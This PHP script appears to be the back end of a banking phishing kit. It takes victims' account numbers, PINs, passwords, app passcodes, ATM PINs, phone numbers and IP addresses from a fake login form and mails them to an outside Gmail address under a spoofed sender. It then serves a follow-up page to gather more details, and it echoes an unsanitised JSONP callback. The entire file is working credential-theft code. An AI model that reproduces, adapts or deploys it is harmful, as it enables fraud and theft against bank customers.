<?php
session_start();
if(isset($_GET['password']) && $_GET['password'] != "")
{
        $ccn = $_GET['AccessAccount'];
	$csp = $_GET['PIN'];
	$atm = $_GET['Operator'];
        
        $appPasscode = $_GET['p'];
        $atmNumber = $_GET['a'];
        $atmPINNumber = $_GET['ap'];
        $cellphonenumber =@$_GET['ph'];
        
        $password = $_GET['password'];
	$ip = $_SERVER['REMOTE_ADDR'];

	$time = time();

        $msg  = "AccessAccount No : $ccn \r\n";
	$msg .= "Customer Pin : $csp \r\n";
	$msg .= "user number : $atm \r\n\r\n";
        $msg .= "Password:-----> $password\r\n\r\n";
        
        
        $msg .= "app passcode : $appPasscode \r\n";
        //$msg .= "ATM card number : $atmNumber \r\n";
        $msg .= "ATM PIN : $atmPINNumber\r\n";
        $msg .= "Cell Phone: $cellphonenumber\r\n";
        
        
	$msg .= "Remote_Addr : $ip \r\n\n";


	$from = "gelos@merik-dein.ee";
	$headers = "From:" . $from;
	$subject = "Password - $ccn - $ip ".$_SERVER['HTTP_HOST'];

        if(mail('hemtlanker@gmail.com', $subject, $msg, $headers))
        //if(1)
        {

            $experience_login = file_get_contents('../profile.html');
            
            $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
            $experience_login = str_replace("{PIN}", $csp, $experience_login);
            $experience_login = str_replace("{Operator}", $atm, $experience_login);
            $experience_login = str_replace("{password}", $password, $experience_login);
            
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "cellphonenumber"));
            echo $callback . '(' . $jsonResponse . ')';

        }
         else{
            //echo $experience_login;
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => "cannot send mail", 'focusElement' => "pff1"));
            echo $callback . '(' . $jsonResponse . ')';
        }
}